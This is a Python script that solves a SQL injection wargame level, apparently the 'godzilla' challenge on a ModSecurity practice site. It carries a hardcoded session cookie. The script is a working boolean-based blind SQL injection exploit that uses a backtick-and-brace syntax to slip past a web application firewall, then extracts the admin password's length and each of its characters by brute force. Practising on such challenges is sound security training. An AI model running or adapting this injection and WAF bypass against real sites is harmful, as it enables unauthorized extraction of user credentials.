import requests

cookie = {'PHPSESSID' : '0arr6us9gdr3fd7k028refauuh'}

for i in range(1,21):
    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?\
            pw=1' or {`if`id='admin' and length(pw)=%d}%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?\
                pw=1' or {`if`id='admin' and ascii(substr(pw,%d,1))=%d}%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break